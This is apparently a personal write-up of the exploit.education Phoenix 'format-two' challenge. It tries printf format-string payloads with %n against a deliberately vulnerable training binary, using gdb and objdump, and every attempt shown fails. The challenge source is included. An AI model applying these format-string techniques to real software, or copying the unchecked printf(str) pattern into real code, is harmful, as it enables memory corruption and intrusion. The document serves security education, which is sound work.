# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result
`Better luck next time!`
### Setup
```
docker start ctf
docker container exec -it ctf bash
```
### Compile code
This is a `format string` challenge using `printf`.  Unlike the **format_one** and **format_zero** challenges:
 - The value to overwrite is not a local variable on the `stack`.
 - Input is provided via `argv[1]`.

```
int changeme;               <-- defined at the "file" level so available inside main() and bounce()

void bounce(char *str) {
      printf(str);          <-- here is the issue!
}

int main(int argc, char **argv) {
  char buf[256];

```
### Writing over a non-stack integer variable with Format String Exploit
Both challenges so far had the `changeme` on the `stack`.  It was conveniently located next to the `destination buffer`.  Overflow the buffer and you would write over the `changeme` variable.

This wouldn't help in this challenge.

With a `Format String` How do you put the address of the `changeme` variable into `printf(str)`?  

Parameter  | Meaning  | Passed as
--|---|--
%d   | decimal (int)  |  value
%u   | unsigned decimal (unsigned int)  |  value
%x| hexadecimal (unsigned int)  |  value
%n| number of bytes written so far (*int) |  reference
%hn| number of bytes written so far (*short) |  reference  
%s | string ((const) (unsigned) char*)  |  reference

##### The %n Parameter
With the  `%n parameter` we can write an integer to nearly any location in the process memory.  Excellent references:
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/.


Example code below:

```
int main() {
    int medium_num;
    short tiny_num;
    printf("AAAAAAAAA%n", &medium_num);    // copies 0x9 into the memory address of 'medium_num'
    printf("BBBB%hn", &tiny_num);          // copies 0x4 into the memory address of 'tiny_num'
    return 0;
}
```
### Finding the changeme variable
##### On a debug build
```
gef➤  print &changeme
$1 = (int *) 0x601050 <changeme>
```
##### Get address
`objdump -t format_two | grep changeme`
##### Read address
`0000000000601054 g     O .bss	0000000000000004              changeme`
##### Read sections of binary
This shows the start and end of `bss` memory. `bss` is uninitialized data `"Block Started by Symbol"`.  It also shows `changeme` is `allocated` and not `read-only`.

If we change `changeme` to a non-null value, it moves to the `data` section of the binary.

##### Disassemble main() in gdb
You can see `changeme` is tested here:
```
0x4006a1 <main+122>       mov    eax, DWORD PTR [rip+0x2009ad]        # 0x601054 <changeme>
0x4006a7 <main+128>       test   eax, eax
0x4006a9 <main+130>       je     0x4006b9 <main+146>
0x4006ab <main+132>       lea    rdi, [rip+0xde]        # 0x400790
```
If you break on `main+128` it is comparing `0` with `0` and then jumps to `Better luck next time!`.

### Inspecting the code
This challenge uses more C APIs than previous `format string` challenges.
```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```



### Find printf starting argument
The `format string` is also placed on the `stack`.  Visually I liked the following diagram:

Top of stack | | printf pointer    |   |   | <-- grows  |  Bottom of stack
--|---|---|---|---|---|--
  | Return Addr  | Addr of format string   | var one  | var two  |   |  

#####  Find address of first printf argument
With brute force you can find the first argument passed to `printf`. Keep sending in "AAAA" and adding another `%08x` until you hit the number.  

##### Result
You find the first argument the entered "AAAA" as `41414141` after 12 x `%08x`:

`AAAA0000000b.00000000.ffffe510.00000000.3830252e.00000000.ffffe410.ffffe510.004006a1.ffffe5f8.ffffe550.41414141.Better luck next time!`
#####  Finding printf's first argument
`run $(python -c 'print "AAAA" + "%08x." * 12')`
#####  Finding printf's first argument ( alternative )
`run "AAAA %p %p %p %p %p %p %p %p %p %p %p %p"`

### Payloads
Different to the first two format string challenges, you pass in the payload as `argv[1]`:
##### Blind shot
```
run $(python -c 'print "%268x" + "\x41\x41\x41\x41"')
Better luck next time!
```
We could inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).  But would that really help if the `changeme` address is not on the `stack`?  No.

##### Re-order changeme address for little endian order
```
# Python 3
>>> s="601054"
>>> "".join(map(str.__add__, s[-2::-2] ,s[-1::-2]))
541060
```
##### re-order Payload at run time
`python -c 'print "\x54\x10\x60\x00"[::-1]' > test.hex`

### Bugs
##### The null byte issue
Any of the following characters in a memory address could cause bugs:

    - \x00 (Null)
    - \x09 (Tab)
    - \x0a (New line)
    - \x0d (Carriage return)
    - \x20 (Space)
##### Python printing
`python -c 'print "\x50\x10\x60\x00"[::-1]' > test.hex`
##### Print bytes
This did a pretty good job as it reversed the byte order. But it added a `New Line` ( `0a`).
```
xxd test.hex
00000000: 0060 1050 0a                             .`.T.
```
##### Echo printing
The `-n` flag stop the character return ( `0a`).
`echo -e -n "\x50\x10\x60\x00" > test.hex`
##### Print bytes
```
xxd test.hex
00000000: 0060 1050                                .`.P
```
### Refined Payloads
##### Try with %n payload
`run $(echo -e -n "\x50\x10\x60\x00%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n")`
##### Get sizeof int type
`p/d sizeof(int)`     # 4
##### Breakpoint on if (changeme != 0)
`x/4bx 0x601054`
##### If debug symbols available
`print &changeme`
##### Result - failed
`0x601054 <changeme>:	0x00	0x00	0x00	0x00`
##### Bytes filling the buffer
```
xxd test.hex
00000000: 5410 6000 2578 2e25 782e 2578 2e25 782e  T.`.%x.%x.%x.%x.
00000010: 2578 2e25 782e 2578 2e25 782e 2578 2e25  %x.%x.%x.%x.%x.%
00000020: 782e 2578 2e25 782e 256e                 x.%x.%x.%n
```
##### Bugs: Null bytes in Echo
`bash: warning: command substitution: ignored null byte in input`.
##### Bugs: in memory
`strncpy` is skipping the `null byte`.  The last Null byte was removed:
 - Payload sent:`"\x54\x10\x60\x00'`
 - `strncpy` turned it into `"\x54\x10\x60"`
```
gef➤  x/272bx 0x00007fffffffe350
0x7fffffffe350:	'A' <repeats 252 times>, "T\020`%\340\006@"

0x7fffffffe440:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe448:	----- issue     ----->	0x54	0x10	0x60	0x??  
```
##### Breakpoint on printf
`b *bounce+24`
##### Breakpoint on memset
If you break on the `memset` call, you find two useful things; the address of `buffer` and the `length` of the buffer.
```
memset@plt (
   $rdi = 0x00007fffffffe410 → 0x0000000000000000,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000000000000100,       # 256 byte buffer
)
```
##### Alternative to get start of buffer
```
p/x $rbp - 0x100
 0x7fffffffe410
```
##### Print buffer when inside of main ( stack )
`x/256bx $rbp - 0x100`

### A rat hole
When debugging, it is important to be aware of what frame you are in. I created a rat hole by mixing frames.  This is how I went down the rat hole:

`run $(echo -n "\x50\x10\x60\x00%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n")`
##### Bugs: instructions not written to stack
```
gef➤  find $sp-0x100, +256, 0x60         # Was expecting: 0060 1050  
Pattern not found.
```
##### Run without seg fault
`run $(echo -n "\x50\x10\x60%x %x %x %x %x %x %x %x %x %x %n \n")`
##### Run with seg fault
`run $(echo -n "\x50\x10\x60%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n \n")`
##### Careful to not mix frames!
I was running in the `main frame`:
```
p/x $rbp - 0x100
$5 = 0x7fffffffe410
```
Ands the inside of the `bounce frame`:
```
p/x $rbp - 0x100
0x7fffffffe300
```

### Troubleshooting - why is the target memory not on the stack?
##### Full the buffer
`run $(echo -n "\x50\x10\x60%x %08x %08x %08x %08x %08x %08x %08x %08x %08x %n \n")`
##### A stack of null bytes
The stack was pretty much all `0x00 bytes`.
##### Back in time
`run $(python -c 'print "AAAA" + "%08x." * 12')`
##### Result
```
x/256bx 0x00007fffffffe410
0x7fffffffe410:	0x41	0x41	0x41	0x41	0x25	0x30	0x38	0x78
0x7fffffffe418:	0x2e	0x25	0x30	0x38	0x78	0x2e	0x25	0x30
0x7fffffffe420:	0x38	0x78	0x2e	0x25	0x30	0x38	0x78	0x2e
0x7fffffffe428:	0x25	0x30	0x38	0x78	0x2e	0x25	0x30	0x38
0x7fffffffe430:	0x78	0x2e	0x25	0x30	0x38	0x78	0x2e	0x25
0x7fffffffe438:	0x30	0x38	0x78	0x2e	0x25	0x30	0x38	0x78
0x7fffffffe440:	0x2e	0x25	0x30	0x38	0x78	0x2e	0x25	0x30
0x7fffffffe448:	0x38	0x78	0x2e	0x25	0x30	0x38	0x78	0x2e
```
##### Try again with Python print instead of Echo
`run $(python -c 'print "\x50\x10\x60" + "%08x." * 12')`
##### Result - interesting!
`00000009.00000000.ffffe510.00000000.78383025.00000000.ffffe410.ffffe510.004006a1.ffffe5f8.ffffe550.25601050.Better luck next time!`
##### The memory address incorrectly padded with a 0x25
`601050   became ->  25601050`
##### Try again with Python print with the null byte
`run $(python -c 'print "\x50\x10\x60\x00" + "%08x." * 12')`
##### Same result
`601050   became ->  25601050`

##### Backtrace
```
backtrace
#0  in _IO_vfprintf_internal "h\230\004\b%p%p%p%p%p%p%p%p%p%p%p%n" at vfprintf.c:1642
#3  in main (argc=0x2, argv=0x7fffffffe618) at format_two.c:23
```












### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```
